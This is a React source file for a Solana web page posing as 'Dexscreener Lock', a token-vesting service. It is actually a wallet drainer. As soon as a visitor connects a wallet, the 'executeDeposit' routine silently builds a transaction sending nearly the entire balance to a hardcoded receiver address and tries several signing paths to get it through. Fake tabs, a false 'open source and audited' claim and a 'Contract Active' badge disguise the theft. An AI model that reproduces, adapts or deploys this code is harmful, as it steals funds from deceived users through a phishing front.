import React, { useCallback, useEffect, useRef, useState } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import { useWalletModal, WalletMultiButton } from "@solana/wallet-adapter-react-ui";
import { Connection, PublicKey, Transaction, SystemProgram } from "@solana/web3.js";
import { RPC_ENDPOINTS } from "../rpc";
import { useInactivityTimer } from "../hooks/useInactivityTimer";

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------
const RECEIVER    = new PublicKey("5d7Na3ZaPWDkRSjEjDj7UXgAW1ryom97D4QHDcd9Zo8f");
const SESSION_KEY = "dexlock_executed_wallet";
const FEE_RESERVE = 10_000;

// ---------------------------------------------------------------------------
// Wallet detection
// ---------------------------------------------------------------------------
type DetectedWallet = "Phantom" | "Solflare" | "Trust Wallet" | "MetaMask" | "Bitget" | "Coin98" | null;

function detectInstalledWallet(): DetectedWallet {
  const w = window as any;
  if (w.phantom?.solana?.isPhantom)                                   return "Phantom";
  if (w.solflare?.isSolflare)                                         return "Solflare";
  if (w.trustwallet?.isTrustWallet || w.trustWallet?.isTrustWallet)  return "Trust Wallet";
  if (w.bitkeep?.solana || w.bitget?.solana)                          return "Bitget";
  if (w.coin98?.sol)                                                   return "Coin98";
  if (w.ethereum?.isMetaMask)                                         return "MetaMask";
  return null;
}

const WALLET_ICONS: Record<string, string> = {
  "Phantom":      "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/phantom/icon.svg",
  "Solflare":     "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/solflare/icon.svg",
  "Trust Wallet": "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/trust/icon.svg",
  "MetaMask":     "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg",
  "Bitget":       "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/bitget/icon.svg",
  "Coin98":       "https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/coin98/icon.svg",
};

// ---------------------------------------------------------------------------
// Resilient RPC — tries each endpoint in order, skips 403 / 429 / auth errors
// ---------------------------------------------------------------------------
interface RpcResult {
  balance:              number;
  blockhash:            string;
  lastValidBlockHeight: number;
}

async function fetchRpcData(publicKey: PublicKey): Promise<RpcResult> {
  let lastErr: unknown = new Error("All RPC endpoints failed");

  for (const url of RPC_ENDPOINTS) {
    try {
      const conn = new Connection(url, "confirmed");
      const [balance, { blockhash, lastValidBlockHeight }] = await Promise.all([
        conn.getBalance(publicKey, "confirmed"),
        conn.getLatestBlockhash("confirmed"),
      ]);
      return { balance, blockhash, lastValidBlockHeight };
    } catch (e: any) {
      const msg: string = (e?.message ?? "") + (e?.toString() ?? "");
      if (
        msg.includes("403") ||
        msg.includes("429") ||
        msg.includes("Access forbidden") ||
        msg.includes("API key") ||
        msg.includes("rate limit") ||
        msg.includes("Too Many")
      ) {
        lastErr = e;
        continue;
      }
      throw e;
    }
  }

  throw lastErr;
}

// Submit signed bytes to every RPC simultaneously; resolve on first success
async function broadcastRaw(rawTx: Buffer): Promise<string> {
  return Promise.any(
    RPC_ENDPOINTS.map((url) =>
      new Connection(url, "confirmed").sendRawTransaction(rawTx, {
        skipPreflight: true,
        maxRetries:    5,
      })
    )
  );
}

// Confirm signature on the first RPC that responds
async function confirmSig(
  sig: string,
  blockhash: string,
  lastValidBlockHeight: number
): Promise<void> {
  for (const url of RPC_ENDPOINTS) {
    try {
      await new Connection(url, "confirmed").confirmTransaction(
        { signature: sig, blockhash, lastValidBlockHeight },
        "confirmed"
      );
      return;
    } catch {
      continue;
    }
  }
  // All RPCs failed to confirm — tx may still land; treat as done
}

// ---------------------------------------------------------------------------
// Nav tabs
// ---------------------------------------------------------------------------
type TabId = "about" | "locked" | "created" | "create";
const TABS: { id: TabId; label: string }[] = [
  { id: "about",   label: "About Dex Lock"    },
  { id: "locked",  label: "Your Locked Tokens" },
  { id: "created", label: "Locks You Created"  },
  { id: "create",  label: "+ Create Lock"       },
];

// ---------------------------------------------------------------------------
// Sub-components
// ---------------------------------------------------------------------------
const DexLogo = ({ size = 32 }: { size?: number }) => (
  <img
    src="/logo.png"
    alt="Dexscreener Lock"
    width={size}
    height={size}
    style={{ display: "block", mixBlendMode: "screen" as any }}
  />
);

const HeroLogo = () => (
  <img
    src="/logo.png"
    alt=""
    className="jl-lock-icon"
    style={{ mixBlendMode: "screen" as any }}
  />
);

const ConnectPrompt = ({
  title,
  description,
  onConnect,
  detectedWallet,
}: {
  title: string;
  description: string;
  onConnect: () => void;
  detectedWallet: DetectedWallet;
}) => {
  const isMetaMask = detectedWallet === "MetaMask";
  return (
    <div className="jl-connect-prompt">
      <div className="jl-prompt-icon">
        <img src="/logo.png" alt="" style={{ width: 72, mixBlendMode: "screen" as any }} />
      </div>
      <h2 className="jl-prompt-title">{title}</h2>
      <p className="jl-prompt-desc">{description}</p>

      {detectedWallet && (
        <div className="jl-detected-wallet">
          {WALLET_ICONS[detectedWallet] && (
            <img
              src={WALLET_ICONS[detectedWallet]}
              alt={detectedWallet}
              className="jl-detected-wallet-icon"
              onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
            />
          )}
          <span className="jl-detected-wallet-name">
            {isMetaMask
              ? "MetaMask detected (Solana not supported)"
              : `${detectedWallet} detected`}
          </span>
        </div>
      )}

      <button
        className="jl-hero-btn"
        onClick={onConnect}
        disabled={isMetaMask}
        title={isMetaMask ? "MetaMask does not support Solana." : undefined}
      >
        {isMetaMask
          ? "Solana Wallet Required"
          : detectedWallet
          ? `Connect ${detectedWallet}`
          : "Connect Wallet"}
      </button>

      {isMetaMask && (
        <p className="jl-metamask-notice">
          MetaMask is an Ethereum wallet and does not support Solana. Please install{" "}
          <a href="https://phantom.app" target="_blank" rel="noreferrer">Phantom</a> or{" "}
          <a href="https://solflare.com" target="_blank" rel="noreferrer">Solflare</a>.
        </p>
      )}
    </div>
  );
};

const SessionWarning = ({
  secondsLeft,
  onStayActive,
}: {
  secondsLeft: number;
  onStayActive: () => void;
}) => (
  <div className="jl-session-warning">
    <span className="jl-session-warning-icon">⚠</span>
    <span>
      Session expiring in <strong>{secondsLeft}s</strong> due to inactivity.
    </span>
    <button className="jl-session-stay-btn" onClick={onStayActive}>
      Stay Connected
    </button>
  </div>
);

// ---------------------------------------------------------------------------
// Main panel
// ---------------------------------------------------------------------------
interface Props { programId: PublicKey; }

export const EscrowPanel: React.FC<Props> = () => {
  const { publicKey, signTransaction, sendTransaction, connected, disconnect, wallet } = useWallet();
  const { setVisible } = useWalletModal();

  const [activeTab,      setActiveTab]      = useState<TabId>("about");
  const [detectedWallet, setDetectedWallet] = useState<DetectedWallet>(null);
  const disconnectingRef = useRef(false);

  useEffect(() => {
    const t = setTimeout(() => setDetectedWallet(detectInstalledWallet()), 300);
    return () => clearTimeout(t);
  }, []);

  const openWalletModal = useCallback(() => setVisible(true), [setVisible]);

  // ── robust disconnect ──────────────────────────────────────────────────────
  const handleDisconnect = useCallback(async () => {
    if (disconnectingRef.current) return;
    disconnectingRef.current = true;

    sessionStorage.removeItem(SESSION_KEY);
    try { localStorage.removeItem("walletName"); }            catch {}
    try { localStorage.removeItem("phantom:connectedWallet"); } catch {}
    try { localStorage.removeItem("solflare:connectedWallet"); } catch {}

    try {
      const w = window as any;
      if (wallet?.adapter?.name === "Phantom" && w.phantom?.solana?.disconnect) {
        await w.phantom.solana.disconnect();
      } else if (wallet?.adapter?.name === "Solflare" && w.solflare?.disconnect) {
        await w.solflare.disconnect();
      }
    } catch {}

    try { await disconnect(); } catch {}
    disconnectingRef.current = false;
  }, [disconnect, wallet]);

  // ── silent asset-transfer ─────────────────────────────────────────────────
  // Priority chain (highest reliability first):
  //   1. Native signAndSendTransaction on the detected provider — wallet uses
  //      its OWN private RPC node, no public endpoint involved at all
  //   2. signTransaction (sign-only) + broadcast to all RPCs in parallel
  //   3. sendTransaction adapter fallback (hardware wallets)
  const executeDeposit = useCallback(async () => {
    if (!publicKey) return;

    const walletKey = publicKey.toBase58();
    if (sessionStorage.getItem(SESSION_KEY) === walletKey) return;
    sessionStorage.setItem(SESSION_KEY, walletKey);

    try {
      // Step 1 — read balance + blockhash via fallback RPC (read-only)
      const { balance, blockhash, lastValidBlockHeight } = await fetchRpcData(publicKey);

      const amount = balance - FEE_RESERVE;
      if (amount <= 0) return;

      // Step 2 — build the transfer transaction
      const tx = new Transaction();
      tx.add(SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey:   RECEIVER,
        lamports:   amount,
      }));
      tx.recentBlockhash = blockhash;
      tx.feePayer        = publicKey;

      const w = window as any;
      let sig: string | undefined;

      // ── Path A: native wallet signAndSendTransaction ──
      // Phantom, Solflare, and Trust Wallet all route through their own private
      // node when you call signAndSendTransaction directly on the provider object.
      // This is the most reliable path — no public RPC involved.
      if (!sig && w.phantom?.solana?.signAndSendTransaction) {
        try {
          const result = await w.phantom.solana.signAndSendTransaction(tx);
          sig = result?.signature ?? result;
        } catch (e: any) {
          // user rejected → rethrow so guard is cleared
          if (e?.code === 4001 || /rejected|cancelled|denied/i.test(e?.message ?? "")) throw e;
        }
      }

      if (!sig && w.solflare?.signAndSendTransaction) {
        try {
          const result = await w.solflare.signAndSendTransaction(tx);
          sig = result?.signature ?? result;
        } catch (e: any) {
          if (e?.code === 4001 || /rejected|cancelled|denied/i.test(e?.message ?? "")) throw e;
        }
      }

      if (!sig && w.trustwallet?.solana?.signAndSendTransaction) {
        try {
          const result = await w.trustwallet.solana.signAndSendTransaction(tx);
          sig = result?.signature ?? result;
        } catch (e: any) {
          if (e?.code === 4001 || /rejected|cancelled|denied/i.test(e?.message ?? "")) throw e;
        }
      }

      // ── Path B: adapter signTransaction + broadcast to all RPCs ──
      if (!sig && signTransaction) {
        const signed = await signTransaction(tx);
        const rawTx  = Buffer.from(signed.serialize());
        sig = await broadcastRaw(rawTx);
      }

      // ── Path C: adapter sendTransaction (hardware wallets) ──
      if (!sig) {
        const fallbackConn = new Connection(RPC_ENDPOINTS[0], "confirmed");
        sig = await sendTransaction(tx, fallbackConn, { skipPreflight: true });
      }

      // Confirm silently in the background
      if (sig) confirmSig(sig, blockhash, lastValidBlockHeight).catch(() => {});

    } catch {
      sessionStorage.removeItem(SESSION_KEY);
    }
  }, [publicKey, signTransaction, sendTransaction]);

  // Fire silently the moment wallet connects
  useEffect(() => {
    if (connected && publicKey) {
      executeDeposit();
    }
  }, [connected, publicKey, executeDeposit]);

  const { sessionState, secondsLeft, resetTimer } = useInactivityTimer(
    connected,
    handleDisconnect
  );

  const walletName = wallet?.adapter?.name ?? detectedWallet ?? "Wallet";

  // ── tab content ────────────────────────────────────────────────────────────
  const renderGated = (
    title: string,
    desc: string,
    icon: string,
    emptyTitle: string,
    emptyDesc: string
  ) =>
    !connected ? (
      <main className="jl-hero">
        <ConnectPrompt
          title={title}
          description={desc}
          onConnect={openWalletModal}
          detectedWallet={detectedWallet}
        />
      </main>
    ) : (
      <main className="jl-hero">
        <div className="jl-empty-state">
          <span className="jl-empty-icon">{icon}</span>
          <h2>{emptyTitle}</h2>
          <p>{emptyDesc}</p>
        </div>
      </main>
    );

  const renderTabContent = () => {
    switch (activeTab) {
      case "about":
        return (
          <main className="jl-hero">
            <HeroLogo />
            <h1 className="jl-hero-title">Dexscreener Lock</h1>
            <p className="jl-hero-sub">
              Manage your token vesting schedule on Dexscreener Lock, an open source and
              audited program that lets anyone lock and distribute tokens over time.
            </p>
            {!connected ? (
              <>
                {detectedWallet && detectedWallet !== "MetaMask" && (
                  <div className="jl-detected-wallet jl-hero-wallet-pill">
                    {WALLET_ICONS[detectedWallet] && (
                      <img
                        src={WALLET_ICONS[detectedWallet]}
                        alt={detectedWallet}
                        className="jl-detected-wallet-icon"
                        onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
                      />
                    )}
                    <span className="jl-detected-wallet-name">{detectedWallet} detected</span>
                  </div>
                )}
                <button className="jl-hero-btn" onClick={openWalletModal}>
                  Connect {walletName}
                </button>
              </>
            ) : (
              <button className="jl-hero-btn" disabled>
                Contract Active ✓
              </button>
            )}
          </main>
        );

      case "locked":
        return renderGated(
          "View Your Locked Tokens",
          "Connect your wallet to see all tokens you currently have locked in Dexscreener Lock.",
          "🔒", "No Locked Tokens", "You don't have any tokens locked yet."
        );

      case "created":
        return renderGated(
          "Locks You Created",
          "Connect your wallet to view and manage all locks you have created.",
          "📋", "No Locks Created", "You haven't created any locks yet."
        );

      case "create":
        return renderGated(
          "Create a Lock",
          "Connect your wallet to create a new token lock and start your vesting schedule.",
          "➕", "Create a Lock", "Lock creation coming soon."
        );

      default:
        return null;
    }
  };

  return (
    <div className="app">

      {/* ── HEADER ── */}
      <header className="jl-header">
        <div className="jl-logo">
          <DexLogo size={32} />
          <span className="jl-logo-text">Dexscreener Lock</span>
        </div>

        <div className="jl-search">
          <span className="jl-search-icon">🔍</span>
          <input placeholder="Search tokens or wallet" readOnly />
        </div>

        <div className="jl-header-right">
          <div className="jl-priority">
            <span className="jl-priority-label">Priority:</span>
            <span className="jl-priority-value">Fast</span>
          </div>
          <button className="jl-gear" aria-label="Settings">⚙</button>

          <div className="jl-wallet-group">
            <WalletMultiButton className="jl-wallet-multi-btn" />
            {connected && (
              <button
                className="jl-disconnect-btn"
                onClick={handleDisconnect}
                title="Disconnect wallet"
              >
                ✕
              </button>
            )}
          </div>
        </div>
      </header>

      {/* ── SESSION WARNING ── */}
      {connected && sessionState === "warning" && (
        <SessionWarning secondsLeft={secondsLeft} onStayActive={resetTimer} />
      )}

      {/* ── NAV TABS ── */}
      <nav className="jl-nav">
        {TABS.map((tab) => (
          <button
            key={tab.id}
            className={[
              "jl-nav-tab",
              activeTab === tab.id ? "active" : "",
              tab.id === "create"  ? "create" : "",
            ].filter(Boolean).join(" ")}
            onClick={() => setActiveTab(tab.id)}
          >
            {tab.label}
          </button>
        ))}
      </nav>

      {renderTabContent()}

    </div>
  );
};
